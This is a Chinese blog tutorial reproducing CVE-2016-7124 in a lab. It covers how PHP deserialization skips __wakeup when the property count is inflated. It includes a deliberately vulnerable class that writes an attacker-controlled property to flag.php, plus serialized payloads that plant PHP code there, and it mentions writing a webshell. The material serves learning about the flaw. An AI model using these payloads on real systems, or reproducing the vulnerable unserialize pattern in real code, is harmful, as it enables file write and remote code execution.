# CVE-2016-7124 反序列化漏洞复现 - SecIN 社区 - 博客园

> 原文：[`www.cnblogs.com/SecIN/p/15704316.html`](https://www.cnblogs.com/SecIN/p/15704316.html)

漏洞成因

今天学习反序列化的时候，看到 cve-2016-7124 的这个漏洞，漏洞产生的原因是因为可以修改属性数的大小跳过 wakeup 的执行，何为 wakeup 呢？

__wakeup 是 PHP 中的一个魔术方法，如果在反序列化一个类的时候，会先检查是否有 __wakeup 的存在，有的话，会先调用 wakeup 里面的内容

![我给你变个魔术日期表情:套路最近表情包的可火-表情包之园](img/a41485e0e9f05899fb39566f334022a8.png)

* * *

# 利用

版本限制

PHP5:<5.6.25

PHP7:<7.0.10

代码

```
class vFREE{
public $name='vFREE';
public $age='18';
function __wakeup(){
$this->age = "18";
}
function __destruct(){
$path='flag.php';
$file_get=file_put_contents($path,$this->name);

}
}
$flag = $_GET['flag'];
$unser = unserialize($flag); 
```

上面是栗子

# 审计一波

类名:vFREE

类属性:name 和 age

魔术方法:__wakeup 和 __destruct

__destruct 是析构方法，一般都是最后或者被销毁才会给调用

类外部用到了反序列话函数 unserialize，但用到这个函数时，就会像检查类 vFREE 中有没有 __wakeup 方法，有的话就执行，没有就跳过，很明显，代码中有 wakeup，但是 wakeup 的内容就是一个赋值操作，并起不了太大的作用，反而 destruct 中可以利用一波，因为 destruct 中打开一个 flag.php 的文件，然后将$this->name 的值作为内容写入到 flag.php 中，假如我们写入一个木马呢，那危害不就上来了么...

我们要传入一个参数 flag，并且将传入的值放入反序列化函数中执行，所以我们要传入的应该是一个序列化后的字符串，此时我们应该类 vFREE 进行序列化，代码如下:

age = "18"; } function __destruct(){ $path='flag.php'; $file_get=file_put_contents($path,$this->name); } } $vfree=new vFREE(); echo serialize($vfree); ?>

序列化后得到

```
O:5:"vFREE":2:{s:4:"name";s:5:"vFREE";s:3:"age";s:2:"18";} 
```

O 即对象的缩写

5 即说明类名有五位字符

2 即有两个类属性

{}即所有类属性名和内容

s 即字符串

4 即类属性名有 4 位字符

name 即类属性名字

以此类推...

此时在看代码，发现写入到 flag.php 中的是$this->name 的值，所以，我们要更改 name 的内容，怎么改呢？把 name 后面 s:5:"vFREE"的 vFREE 改成你先插入的内容，比如改成,就变成

```
O:5:"vFREE":2:{s:4:"name";s:18:"<?php phpinfo();?>";s:3:"age";s:2:"18";} 
```

注意，此时 s 后面的 5 改成 18 了，因为一共有 18 个字符，所以，数值要随着字符数的变化而变化，然后传入即可

当然，此时还是会先执行 wakeup 方法的，并未先执行 destruct，根据开头讲的，更改原有属性值达到绕过过 wakeup 的效果，此时的类中属性值是 2，我们要将 2 改成其他数字，改成什么都行，反之一定要大于 2，比如

```
O:5:"vFREE":5:{s:4:"name";s:18:"<?php phpinfo();?>";s:3:"age";s:2:"18";} 
```

改成 5，就可以绕过了

![](img/7093fa7ba4d418807538f7250182b5a6.png)

![](img/3454fdad552040cc382a6446a9c858e7.png)

成功写入，当然，可以写其他的，自己发挥啦，别干坏事就好了